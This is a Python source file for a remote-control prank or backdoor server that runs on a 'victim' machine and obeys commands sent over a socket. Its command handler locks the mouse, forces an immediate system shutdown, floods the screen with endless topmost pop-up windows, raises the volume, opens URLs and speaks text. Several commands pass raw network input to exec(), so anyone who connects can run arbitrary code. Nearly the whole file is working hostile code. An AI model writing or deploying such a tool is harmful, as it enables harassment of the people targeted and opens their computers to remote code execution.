import socket
import threading
import os
import pyautogui
import time
import tkinter
import random
import webbrowser
import pyttsx3 as tts

from pynput.keyboard import Key, Controller


def wait(touter):
    time.sleep(touter)


pyautogui.FAILSAFE = False
HEADER = 64
SERVER = socket.gethostbyname(socket.gethostname())
PORT = 9718
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(ADDR)

enabled = False


def lockMouse():
    while True:
        global enabled
        if enabled:
            pyautogui.moveTo(1366, 768)
            wait(.1)
        else:
            wait(.1)


lockingthread = threading.Thread(target=lockMouse, daemon=True)

lockingthread.start()

def Speak(dialouge, volumelevel=.5):
    engine = tts.init()
    engine.setProperty('volume', volumelevel)
    engine.say(dialouge)
    engine.runAndWait()


def newwindow(titlee, text, size):
    tk = tkinter.Tk(className=f"{titlee}")
    tk.geometry(f"{size}")
    w = tkinter.Label(tk, text=f"{text}").pack()
    tk.mainloop()


def newwindowloop(titlee, text, size):
    while True:
        x = random.randint(0, 1366)
        y = random.randint(0, 768)
        tk = tkinter.Tk(className=f"{titlee}")
        tk.attributes('-topmost', True)
        tk.geometry(f"{size}+{x}+{y}")
        w = tkinter.Label(tk, text=f"{text}").pack()
        tk.lift()
    tk.mainloop()
    time.sleep(.05)


def newWin(titlee="Presidential Alert", text="I like beans", size="200x300"):
    threadwindow = threading.Thread(target=newwindow, daemon=True, args=(titlee, text, size))
    threadwindow.start()


def newLoop(titlee="Presidential Alert", text="I like beans", size="200x300"):
    threadwindowloop = threading.Thread(target=newwindowloop, daemon=True, args=(titlee, text, size))
    threadwindowloop.start()


def volume(amt=50):
    keyboard = Controller()
    if int(amt) > 0:
        for i in range(int(amt)):
            keyboard.press(Key.media_volume_up)
            keyboard.release(Key.media_volume_up)
    elif int(amt) < 0:
        for i in range(abs(int(amt))):
            keyboard.press(Key.media_volume_down)
            keyboard.release(Key.media_volume_down)


def openUrl(urlink="https://www.discord.com"):
    webbrowser.open(f"{urlink}", new=1)


# --------------------------------------------------------------------##

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")

    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            if msg == DISCONNECT_MESSAGE:
                connected = False

            print(f"[{addr}] {msg}")
            if msg == "--help":
                conn.send(
                    f"[{SERVER}] Following commands are:\n        lockMouse()\n       unlockMouse()\n     shutdown\n      volume(int)\n        newWin(title, text, size)\n      newLoop(title, text, size)".encode(
                        FORMAT))

            elif msg == "unlockMouse()":
                conn.send("Unlocking the mouse.".encode(FORMAT))
                global enabled
                enabled = False

            elif msg == "lockMouse()":
                conn.send("Victims mouse is locked.".encode(FORMAT))
                enabled = True
                print("test")

            elif msg == "shutdown":
                conn.send("Closing Connection and Shutting down targets desktop.".encode(FORMAT))
                conn.close()
                os.system("shutdown /s /t 1")

            elif "newWin(" in msg:
                conn.send("Opening window.".encode(FORMAT))
                try:
                    exec(msg)
                except SyntaxError:
                    conn.send("Invalid syntax.".encode(FORMAT))

            elif msg == "reboot":
                conn.send("rebooting...".encode())
                conn.close()
                start()

            elif "volume(" in msg:
                conn.send("Changing volume.".encode(FORMAT))
                try:
                    exec(msg)
                except SyntaxError:
                    conn.send("Invalid syntax.".encode(FORMAT))

            elif "newLoop(" in msg:
                conn.send("Bombing screen/looping.".encode(FORMAT))
                try:
                    exec(msg)
                except SyntaxError:
                    conn.send("Invalid syntax.".encode(FORMAT))

            elif "openUrl(" in msg:
                try:
                    conn.send("Opening link.".encode(FORMAT))
                    exec(msg)
                except SyntaxError or NameError:
                    conn.send("Invalid syntax.".encode(FORMAT))

            elif "Speak(" in msg:
                conn.send("Speaking...".encode(FORMAT))
                try:
                    exec(msg)
                except SyntaxError:
                    conn.send("Invalid syntax.".encode(FORMAT))

            else:
                conn.send("That is not a valid command.".encode(FORMAT))
    conn.close()


def start():
    s.listen()
    print(f"[LISTENING] Server is listening {SERVER}")
    while True:
        conn, addr = s.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 2}")


start()
print("[STARTING] Server is starting...")
